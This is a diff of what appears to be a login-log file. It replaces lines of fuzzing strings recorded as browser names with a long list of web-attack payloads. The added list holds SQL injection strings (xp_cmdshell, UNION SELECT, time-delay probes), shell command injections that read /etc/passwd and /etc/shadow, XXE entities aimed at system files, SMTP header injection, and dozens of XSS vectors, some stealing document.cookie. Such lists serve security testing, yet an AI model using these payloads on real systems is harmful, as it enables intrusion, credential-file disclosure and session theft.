@@ -1,58 +1,122 @@
-Last logged in on 07-05-2017 using browser %A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser None 
-Last logged in on 07-05-2017 using browser &#34;\t&#34; 
-Last logged in on 07-05-2017 using browser # 
-Last logged in on 07-05-2017 using browser #&amp;apos; 
-Last logged in on 07-05-2017 using browser #&#39; 
-Last logged in on 07-05-2017 using browser #xA 
-Last logged in on 07-05-2017 using browser #xA#xD 
-Last logged in on 07-05-2017 using browser #xD 
-Last logged in on 07-05-2017 using browser #xD#xA 
-Last logged in on 07-05-2017 using browser $NULL 
-Last logged in on 07-05-2017 using browser $null 
-Last logged in on 07-05-2017 using browser % 
-Last logged in on 07-05-2017 using browser %#0123456xx%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%Sx%% 
-Last logged in on 07-05-2017 using browser 
+
+/usr/bin/id
+id
+ping -n 30 127.0.0.1 
+DATA
+foo
+.
+MAIL+FROM:+<youremail>
+RCPT+TO:+<youremail>
+DATA
+From:+<youremail>
+To:+<youremail>
+Subject:+tst
+foo
+.
+DATA
+foo
+.
+MAIL+FROM:+<youremail>
+RCPT+TO:+<youremail>
+DATA
+From:+<youremail>
+To:+<youremail>
+Subject:+test
+foo
+.
+ 
+$(sleep 50) 
+'sleep 50' 
+d 
+n 
+s 
+x 
+| 
++document.cookie</script> 
+or 1=1 
+SS");</script> 
+ 
+id 
+ping -i 30 127.0.0.1 & 
+ping -n 30 127.0.0.1 & 
+OR 
+cmd=&quot;/bin/cat /etc/passwd&quot;--&gt; 
+cmd=&quot;/bin/cat /etc/shadow&quot;--&gt; 
+cmd=&quot;/usr/bin/id;--&gt; 
+(select top 1 
+-- 
+; 
+UNION ALL SELECT 
+UNION SELECT 
+or ''=' 
+or '1'='1 
+or '1'='1'-- 
+or 'x'='x 
+or (EXISTS) 
+or 0=0 # 
+or 0=0 -- 
+or 1 in (@@version)-- 
+or 1=1 or ''=' 
+or 1=1-- 
+or a=a-- 
+or uid like '% 
+or uname like '% 
+or user like '% 
+or userid like '% 
+or username like '% 
+or 1=1 
+SRC=javascript:alert(%27XSS%27)></IFRAME> 
+or ('a'='a 
+exec master..xp_cmdshell 
+exec xp_regread 
+waitfor delay '0:30:0'-- 
+or 'x'='x'; 
+select * 
+from dual-- 
+or 1=1 
+or 1 in (@@version)-- 
+or 1=1-- 
+waitfor delay '0:30:0'-- 
+* 
+from dual-- 
+111111 
+ping 127.0.0.1 ; 
+111111 
+-la 
+/etc/passwd') 
+ script > < / script> 
+n=0;while(true){n++;}</script>]]> 
+version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo> 
+version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo> 
+version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo> 
+version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo> 
+version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo> 
+version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo> 
+xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML> 
+"""><SCRIPT>alert("XSS")</SCRIPT>"> 
+DYNSRC="javascript:alert('XSS')"> 
+LOWSRC="javascript:alert('XSS')"> 
+SRC=" &#14;  javascript:alert('XSS');"> 
+SRC="jav	ascript:alert('XSS');"> 
+SRC="jav&#x09;ascript:alert('XSS');"> 
+SRC="jav&#x0A;ascript:alert('XSS');"> 
+SRC="jav&#x0D;ascript:alert('XSS');"> 
+SRC="javascript:alert('XSS')" 
+SRC="javascript:alert('XSS');"> 
+SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> 
+SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;> 
+SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> 
+SRC=JaVaScRiPt:alert('XSS')> 
+SRC=`javascript:alert("'XSS'")`> 
+SRC=javascript:alert(&quot;XSS&quot;)> 
+SRC=javascript:alert('XSS')> 
+SRC=javascript:alert(String.fromCharCode(88,83,83))> 
+SRC='&#x6a;avasc&#000010ript:a&#x6c;ert(document.&#x63;ookie)'> 
+SRC='javasc	ript:alert(document.cookie)'> 
+SRC='javascript:alert(document.cookie)'> 
+phpinfo(); exit;/*</name> 
+ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN> 
+ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]> 
+SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN> 
+@@variable 
+-e 'print ".%p" x 80'` 
